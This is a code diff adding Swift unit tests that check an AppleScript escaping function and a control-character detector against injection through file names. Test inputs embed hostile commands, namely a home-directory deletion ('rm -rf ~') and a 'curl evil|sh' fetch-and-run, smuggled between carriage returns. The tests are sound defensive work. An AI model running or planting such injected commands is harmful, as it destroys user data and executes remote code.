@@ -54,6 +54,23 @@ final class HotshotCoreTests: XCTestCase {
         XCTAssertEqual(appleScriptEscaped(#"/tmp/a\b "quoted".png"#), #"/tmp/a\\b \"quoted\".png"#)
     }
 
+    func testAppleScriptEscapedNeutralizesControlCharacters() {
+        XCTAssertEqual(appleScriptEscaped("/tmp/a\rrm -rf ~\r.png"), #"/tmp/a\rrm -rf ~\r.png"#)
+        XCTAssertEqual(appleScriptEscaped("line1\nline2"), #"line1\nline2"#)
+        XCTAssertEqual(appleScriptEscaped("tab\there"), #"tab\there"#)
+        // Other control characters and Unicode line separators are dropped.
+        XCTAssertEqual(appleScriptEscaped("a\u{01}b\u{7F}c\u{2028}d\u{2029}e"), "abcde")
+    }
+
+    func testContainsControlCharactersFlagsInjectionAttempts() {
+        XCTAssertFalse(containsControlCharacters("/Users/me/My Shots/a b.png"))
+        XCTAssertTrue(containsControlCharacters("x\rcurl evil|sh\r.png"))
+        XCTAssertTrue(containsControlCharacters("x\n.png"))
+        XCTAssertTrue(containsControlCharacters("x\t.png"))
+        XCTAssertTrue(containsControlCharacters("x\u{7F}.png"))
+        XCTAssertTrue(containsControlCharacters("x\u{2028}.png"))
+    }
+
     private func makeDirectory() throws -> URL {
         let url = URL(fileURLWithPath: FileManager.default.currentDirectoryPath)
             .appendingPathComponent(".build")
